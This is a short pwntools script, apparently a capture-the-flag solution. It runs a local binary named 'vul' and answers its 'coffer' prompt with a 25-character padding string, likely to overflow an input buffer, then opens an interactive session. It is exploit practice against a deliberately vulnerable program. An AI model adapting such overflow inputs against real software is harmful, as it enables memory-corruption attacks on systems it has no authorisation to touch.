from pwn import *

c = process('./vul')
c.sendlineafter('What do you want to fill your coffer with?', 'AAAABBBBCCCCDDDDEEEEFFFFG')
c.interactive()